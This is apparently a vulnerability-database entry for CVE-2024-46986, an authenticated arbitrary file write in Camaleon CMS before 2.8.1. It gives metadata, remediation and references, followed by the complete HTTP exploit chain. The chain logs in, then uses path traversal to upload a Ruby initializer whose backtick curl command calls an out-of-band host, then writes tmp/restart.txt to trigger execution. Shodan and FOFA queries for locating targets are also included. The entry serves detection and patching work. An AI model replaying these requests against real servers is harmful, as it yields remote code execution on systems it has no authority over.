---
layout: post
cve_id: CVE-2024-46986
title: Camaleon CMS < 2.8.1 Arbitrary File Write to RCE
pcap: true
pcap_path: /pcaps/2024/CVE-2024-46986.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-46986.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,rootxharsh,pdresearch
severity: critical
impact: 'Authenticated attackers can write arbitrary files to any location on the
  web server, potentially achieving remote code execution.

  '
remediation: 'Update Camaleon CMS to version 2.8.1 or later.

  '
reference:
- https://github.com/advisories/GHSA-wmjg-vqhv-q5p5
- https://codeql.github.com/codeql-query-help/ruby/rb-path-injection
- https://owasp.org/www-community/attacks/Path_Traversal
- https://github.com/nomi-sec/PoC-in-GitHub
- https://github.com/fkie-cad/nvd-json-data-feeds
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
  cvss-score: 9.9
  cve-id: CVE-2024-46986
  cwe-id: CWE-22,CWE-74
  epss-score: 0.92152
  epss-percentile: 0.99693
  cpe: cpe:2.3:a:tuzitio:camaleon_cms:*:*:*:*:*:*:*:*
metadata:
  max-request: 4
  verified: true
  vendor: tuzitio
  product: camaleon_cms
  shodan-query: title:"Camaleon CMS"
  fofa-query: title="Camaleon CMS"
tags:
- cve
- cve2024
- camaleon
- intrusive
- rce
- file-upload
- authenticated
- vuln
---

## ðŸ” Vulnerability Description
An arbitrary file write vulnerability accessible via the upload method of the MediaController allows authenticated users to write arbitrary files to any location on the web server Camaleon CMS is running on (depending on the permissions of the underlying filesystem). E.g. This can lead to a remote code execution in case an attacker is able to write a Ruby file into the config/initializers/ subfolder of the Ruby on Rails application


## ðŸŒ HTTP Request
```nohighlight
GET /admin/login HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /admin/login HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0
Content-Length: 79
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close

authenticity_token=DickQk&user%5Busername%5D=PFTATE&user%5Bpassword%5D=wAE2TywS
```

```nohighlight
POST /admin/media/upload?actions=false HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
Connection: close
Content-Length: 477
Content-Type: multipart/form-data;boundary=----WebKitFormBoundarynJs8ffRP2MgQXiF8
Accept-Encoding: gzip

------WebKitFormBoundarynJs8ffRP2MgQXiF8
Content-Disposition: form-data; name="file_upload"; filename="nSZlmyUc.rb"
Content-Type: text/x-ruby-script

`curl d5jjv19le0o1vb7v6sogx5wawagn97t6o.oast.live`
------WebKitFormBoundarynJs8ffRP2MgQXiF8
Content-Disposition: form-data; name="folder"

../../../config/initializers/
------WebKitFormBoundarynJs8ffRP2MgQXiF8
Content-Disposition: form-data; name="skip_auto_crop"

true
------WebKitFormBoundarynJs8ffRP2MgQXiF8--
```

```nohighlight
POST /admin/media/upload?actions=false HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Connection: close
Content-Length: 438
Content-Type: multipart/form-data;boundary=----WebKitFormBoundarynJs8ffRP2MgQXiF8
Accept-Encoding: gzip

------WebKitFormBoundarynJs8ffRP2MgQXiF8
Content-Disposition: form-data; name="file_upload"; filename="restart.txt"
Content-Type: text/x-ruby-script

38EoZv8g7vS3tCIP4PESVjv75pv
------WebKitFormBoundarynJs8ffRP2MgQXiF8
Content-Disposition: form-data; name="folder"

../../../tmp/
------WebKitFormBoundarynJs8ffRP2MgQXiF8
Content-Disposition: form-data; name="skip_auto_crop"

true
------WebKitFormBoundarynJs8ffRP2MgQXiF8--
```

